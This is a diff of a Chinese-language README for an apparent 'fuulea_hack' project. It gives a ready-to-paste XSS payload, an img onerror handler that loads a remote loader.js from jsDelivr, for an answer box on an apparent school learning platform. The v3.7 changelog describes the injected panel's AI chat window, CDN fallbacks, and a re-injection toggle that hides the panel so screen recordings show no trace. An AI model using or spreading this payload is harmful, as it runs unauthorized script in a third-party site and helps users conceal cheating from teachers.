@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.6/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.7/loader.js'">
 ```
 
 154 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
@@ -27,6 +27,14 @@
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 >
 > `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+
+## v3.7
+
+- **聊天室改成独立浮窗**：从 AI 卡片里脱出来，标题栏可自由拖动，右下角手柄可自由缩放；位置和大小记在本机 `fh:ai:roomRect`，下次打开原样恢复，双击标题栏复位到屏幕中央。
+- **全屏按钮可反复进出**：退出全屏时把进入前的内联位置 / 尺寸 / 圆角 / 阴影 / 缩放状态原样还原，浮动窗口不会被卡成整屏；全屏按钮切换后的 600ms 内点在遮罩上不会误关窗口（之前按钮随布局跳位，第二下正好点到遮罩）。
+- **主面板高度固定为 400px**（视口不够时 `86vh`）：切「学习 / 工具 / chat / 白板 / 便签」不再一跳一跳，内容多的页面在面板内滚动；迷你态仍按内容自适应。
+- 版本号 `TAG` / AI 头栏 / 主面板标签统一升到 3.7。
+- 补充：桌面实验页 `探索生长素类似物促进插条生根的最适浓度.html` 的「下一批浓度」输入框只接受数字（`trim().split(/[\s,，、;；]+/).map(Number)`），页面没有 `v-html` / `innerHTML` 回显，把 `<img onerror=...>` 注入串粘进去只会当普通文本，**不能**靠它加载插件；要在这页用插件只能直接改 HTML，在 `</body>` 前加 `loader.js`，或使用书签脚本。
 
 ## v3.6
 
